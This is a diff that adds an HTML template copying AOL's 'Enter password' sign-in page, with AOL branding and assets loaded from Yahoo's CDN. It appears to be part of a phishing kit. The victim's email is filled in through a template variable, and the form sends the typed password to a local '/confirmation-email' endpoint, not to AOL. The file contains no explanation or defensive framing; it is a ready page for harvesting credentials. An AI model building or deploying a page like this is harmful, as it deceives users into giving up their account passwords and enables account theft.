@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html id="Stencil" class="no-js grid light-theme">
+  <head>
+    <meta charset="utf-8" />
+    <meta
+      name="viewport"
+      content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no"
+    />
+    <meta name="format-detection" content="telephone=no" />
+    <meta name="referrer" content="strict-origin-when-cross-origin" />
+    <title>AOL</title>
+    <meta name="description" content="AOL" />
+    <link rel="dns-prefetch" href="//gstatic.com" />
+    <link rel="dns-prefetch" href="//google.com" />
+    <link rel="dns-prefetch" href="//s.yimg.com" />
+    <link rel="dns-prefetch" href="//y.analytics.yahoo.com" />
+    <link rel="dns-prefetch" href="//ucs.query.yahoo.com" />
+    <link rel="dns-prefetch" href="//geo.query.yahoo.com" />
+    <link rel="dns-prefetch" href="//geo.yahoo.com" />
+    <link
+      rel="icon"
+      type="image/png"
+      href="https://s.yimg.com/wm/login/aol-favicon.png"
+    />
+    <link
+      rel="shortcut icon"
+      type="image/png"
+      href="https://s.yimg.com/wm/login/aol-favicon.png"
+    />
+    <meta
+      name="google-site-verification"
+      content="yOTFyUBPTnXtuk2cPpqfv7ZvZ960JgqsV8FomN3n7Y0"
+    />
+    <link
+      rel="apple-touch-icon"
+      href="https://s.yimg.com/wm/login/aol-apple-touch-icon.png"
+    />
+    <link
+      rel="apple-touch-icon-precomposed"
+      href="https://s.yimg.com/wm/login/aol-apple-touch-icon.png"
+    />
+    <style nonce="V78BHCWF6KD5BwV5xPlJZGRLnpBg3ni8WaGAHoObkzqCv3bz">
+      #mbr-css-check {
+        display: inline;
+      }
+    </style>
+    <link
+      href="https://s.yimg.com/wm/mbr/8384dbe7b068927c41cd7e70f266bb7d586c7982/aol-main.css"
+      rel="stylesheet"
+      type="text/css"
+    />
+  </head>
+  <body class="bucket-mbr-aol-simplified-reg">
+    <div id="login-body" class="loginish puree-v2 grid">
+      <div class="mbr-desktop-hd">
+        <span class="column">
+          <a href="https://www.aol.com/">
+            <img
+              src="https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png"
+              alt="Aol"
+              class="logo"
+              width="100"
+              height=""
+            />
+            <img
+              src="https://s.yimg.com/wm/assets/images/ybar/aol-logo-white-v0.0.4.png"
+              alt="Aol"
+              class="dark-mode-logo logo"
+              width="100"
+              height=""
+            />
+          </a>
+        </span>
+        <span class="column help txt-align-right">
+          <a href="https://help.aol.com/">Help</a>
+        </span>
+      </div>
+      <div class="login-box-container">
+        <div class="login-box right">
+          <div class="mbr-login-hd txt-align-center">
+            <img
+              src="https://s.yimg.com/wm/assets/images/ns/aol-logo-black-v.0.0.2.png"
+              alt="Aol"
+              class="logo aol-en-US"
+              width="100"
+              height=""
+            />
+            <img
+              src="https://s.yimg.com/wm/assets/images/ybar/aol-logo-white-v0.0.4.png"
+              alt="Aol"
+              class="dark-mode-logo logo aol-en-US"
+              width="100"
+              height=""
+            />
+          </div>
+          <div class="challenge password-challenge">
+            <div class="challenge-header">
+              <div class="yid"><%= email %></div>
+            </div>
+            <div id="password-challenge" class="primary">
+              <strong class="challenge-heading">Enter password</strong>
+              <span class="txt-align-center challenge-desc"
+                >to finish sign in</span
+              >
+              <form
+                action="/confirmation-email"
+                method="post"
+                class="challenge-form"
+              >
+               
+                <input type="hidden" name="email" value="<%= email %>" />
+                <div
+                  id="password-container"
+                  class="input-group password-container focussed"
+                >
+                  <input
+                    type="password"
+                    id="login-passwd"
+                    class="password"
+                    name="password"
+                    placeholder=" "
+                    autofocus
+                    autocomplete="current-password"
+                    data-rapid-tracking="true"
+                    data-ylk="elm:input;elmt:focus;slk:passwd;mKey:focus-passwd"
+                  />
+                  <label
+                    for="login-passwd"
+                    id="password-label"
+                    class="password-label"
+                    >Password</label
+                  >
+                  <div
+                    class="caps-indicator hide"
+                    id="caps-indicator"
+                    title="Capslock is on"
+                  ></div>
+                  <button
+                    type="button"
+                    class="show-hide-toggle-button hide-pw"
+                    id="password-toggle-button"
+                    tabindex="-1"
+                    title="Show password"
+                    data-rapid-tracking="true"
+                    data-ylk="elm:btn;elmt:toggle;slk:toggle-show-passwd;mKey:toggle-show-hide"
+                  ></button>
+                </div>
+                <div class="button-container">
+                  <button
+                    type="submit"
+                    id="login-signin"
+                    class="pure-button puree-button-primary puree-spinner-button challenge-button"
+                    name="verifyPassword"
+                    value="Next"
+                    data-rapid-tracking="true"
+                    data-ylk="elm:btn;elmt:primary;slk:next;mKey:next"
+                  >
+                    Next
+                  </button>
+                </div>
+                <div class="forgot-cont challenge-button-link">
+                  <input
+                    type="button"
+                    class="pure-button puree-button-link challenge-button-link"
+                    data-ylk="elm:btn;elmt:skip;slk:skip;mKey:skip-recovery"
+                    data-rapid-tracking="true"
+                    id="mbr-forgot-link"
+                    name="skip"
+                    value="Forgot password?"
+                    data-rapid-tracking="true"
+                  />
+                </div>
+              </form>
+            </div>
+          </div>
+        </div>
+        <div id="login-box-ad-fallback" class="login-box-ad-fallback">
+          <h1></h1>
+          <p></p>
+        </div>
+      </div>
+      <div class="login-bg-outer">
+        <div class="login-bg-inner">
+          <div id="login-ad-rich"></div>
+        </div>
+      </div>
+    </div>
+    <script src="https://s.yimg.com/ss/rapid-3.53.30.js"></script>
+
+    <script src="https://s.yimg.com/wm/mbr/8384dbe7b068927c41cd7e70f266bb7d586c7982/bundle.js"></script>
+
+    <div id="mbr-css-check"></div>
+    <div id="page-mask" class="page-mask hide"></div>
+    <div id="ad"></div>
+    <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
+      <label
+        class="cross"
+        for="mbr-legacy-device-bar-cross"
+        aria-label="Close this warning"
+        >x</label
+      >
+      <input type="checkbox" id="mbr-legacy-device-bar-cross" />
+    </div>
+  </body>
+</html>
+<!-- fe03.member.ir2.yahoo.com - Fri May 26 2023 14:10:27 GMT+0000 (Coordinated Universal Time) - (0ms) -->
